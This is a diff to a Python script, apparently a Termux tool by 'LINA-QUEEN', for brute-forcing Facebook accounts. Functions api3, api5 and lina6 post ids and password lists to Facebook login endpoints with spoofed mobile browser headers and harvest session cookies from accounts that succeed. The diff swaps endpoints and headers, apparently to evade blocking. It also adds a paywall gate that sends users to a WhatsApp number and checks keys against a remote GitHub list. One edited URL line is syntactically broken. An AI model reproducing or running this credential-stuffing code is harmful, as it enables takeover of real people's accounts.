@@ -148,6 +148,78 @@ device = {
         'fbsv':fbsv,
         'fbca':fbca,
         'fbdm':fbdm}
+        
+        
+def main_apv():
+
+    imt="QUEEN=="
+
+    ak="LINA="
+
+    os.system('clear')
+
+    print(logo)
+
+    try:
+
+        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
+
+    except IOError:
+
+        os.system("clear")
+
+        print(logo)
+        print ("YOUR TOKEN IS NOT APROVAL")     
+        print ("")
+
+        myid=uuid.uuid4().hex[:10].upper()
+
+        print ("  YOUR KEY : "+ak+myid+imt)
+
+        print ("•───────────────────────────────────────•")
+
+        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
+
+        kok.write(myid+imt)
+
+        kok.close()
+
+        print ("")
+
+        print ("")
+
+        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")
+
+        print ("•───────────────────────────────────────•")
+
+        time.sleep(3.5)
+
+        tks = 'Dear%20LINA%QUEEN,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt
+
+        os.system('am start https://wa.me/+923269916436?text=' + tks)
+
+        
+
+    r1=requests.get("https://raw.githubusercontent.com/LINA-QUEEN42/LINA-PK/main/Approval.txt").text
+
+    if key1 in r1:
+
+        menu()
+
+    else:
+
+        os.system("clear")
+
+        print(logo)
+        print ("    \033[1;32mYOUR KEY : "+ak+key1)     
+        time.sleep(3.5)
+
+        tks = 'Dear%20LINA%20QUEEN,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1
+
+        os.system('am start https://wa.me/+923269916436?text=' + tks)        
+        
+        
+        
 
 logo=("""\033[1;97m
       db      d888888b d8b   db  .d8b.  
@@ -160,7 +232,7 @@ logo=("""\033[1;97m
 [~] Author   : LINA-QUEEN 
 [~] Facebook : LINA KUMARI
 [~] Tool     : FREE
-[~] Version  : 0.1
+[~] Version  : 26.1
 \033[1;37m----------------------------------------------""")
 def linex():
 	print('\033[1;37m----------------------------------------------')
@@ -670,17 +742,25 @@ def api3(ids,names,passlist):
 "generate_machine_id": "1",
 "fb_api_req_friendly_name": "authenticate",}
                         headers={
-                                "Accept-Encoding": "gzip, deflate",
-"Accept": "*/*",
-"Connection": "keep-alive",
-"User-Agent": ua,
-"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"X-FB-Friendly-Name": "authenticate",
-"X-FB-Connection-Type": "unknown",
-"Content-Type": "application/x-www-form-urlencoded",
-"X-FB-HTTP-Engine": "Liger",
-"Content-Length": "329",}
-                        url = 'https://b-graph.facebook.com/auth/login'
+    'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'referer': 'https://m.facebook.com/login/?refsrc=deprecated',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"8.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
+                        url = 'https://m.facebook.com/login/?refsrc=deprecated&rtime=1690732822&subno_key=AaHuP6SRSTphvNZGHFS0XP3xPUXRLmsv7aWU8afQ0pbKLwJY77ASr_VkW7XEgrKbFrYYTKRE18i18menWvIdAaG1cb5sgfA4ZMNq4UfOWVEfQTPYK5wJdRc9zGsqVcm6z0QLD6-LhQKV3lhro7UOYGvtAjYuGEl6gdr5Lb17sbZQYkvOs7BfiDDxCGKlm5_6WvB53qfqPa8RRMG8XcodpXBpiRR95D6MlywnbXJC7M5JVcigZJyYzS43DjtTWtWX_Z9l5FOz1pXMotxCHolIDYonQ0ZewBkVFxWEOFLvY8Ek55O_l6lVrE6V0-2MA7qjdaE&hrc=1&wtsid=rdr_0FsbWwDqC7kfP6u6l&_rdr',
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
@@ -881,23 +961,24 @@ def api5(ids,names,passlist):
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d",}
                         headers={
-                                'User-Agent': ua,
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': '25227',
-'X-FB-SIM-HNI': '29752',
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-'Content-Length': '706'}
-                        url = 'https://b-graph.facebook.com/auth/login'
+    'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"8.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
+                        url = 'https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
@@ -1532,7 +1613,7 @@ def lina6(ids,passlist):
 			sys.stdout.write('\r\r\033[1;37m [LINA-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			ua = random.choice(ugen)
-			free_fb = session.get('https://p.facebook.com').text
+			free_fb = session.get('https://free.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1543,22 +1624,26 @@ def lina6(ids,passlist):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'www.facebook.com',
-			'method':'GET',
-		    'path': 'act',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
-           'sec-ch-ua-mobile': '?0',
-           'sec-ch-ua-platform': '"Linux"',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'none',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': ua}
-			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+			header_freefb = {'authority':'p.facebook.com',
+			'upgrade-insecure-requests': '1',
+			'viewport-width': '980',
+			'method': 'path',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
+			'dnt':'1', 
+			'x-requested-with':'mark.via.gp', 
+			'sec-fetch-site': 'none',
+			'sec-fetch-mode': 'navigate',
+			'sec-fetch-user': '?1',
+			'sec-fetch-dest': 'document',
+			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+			'cache-control': 'max-age=0',
+			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
+			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
+			"sec-ch-prefers-color-scheme": "light",
+			'user-agent': ua}
+			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1589,7 +1674,7 @@ def lina6(ids,passlist):
 	except:
 		pass
 try:
-	menu()
+	main_apv()
 except requests.exceptions.ConnectionError:
 	print('\n No internet connection ...')
 	exit()
